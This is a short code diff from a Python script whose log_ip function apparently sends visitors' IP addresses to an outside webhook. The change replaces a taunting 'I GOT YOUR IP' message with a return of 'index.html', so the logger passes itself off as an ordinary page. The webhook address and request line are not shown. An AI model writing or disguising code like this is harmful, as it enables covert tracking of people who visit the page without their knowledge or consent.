@@ -16,7 +16,7 @@ def log_ip():
         print("Webhook Status:", r.status_code)  # für Logs
     except Exception as e:
         print("Error:", str(e))
-    return "FUCK I GOT YOUR IP"
+    return ('index.html')
     time.sleep(2)
 
 if __name__ == "__main__":
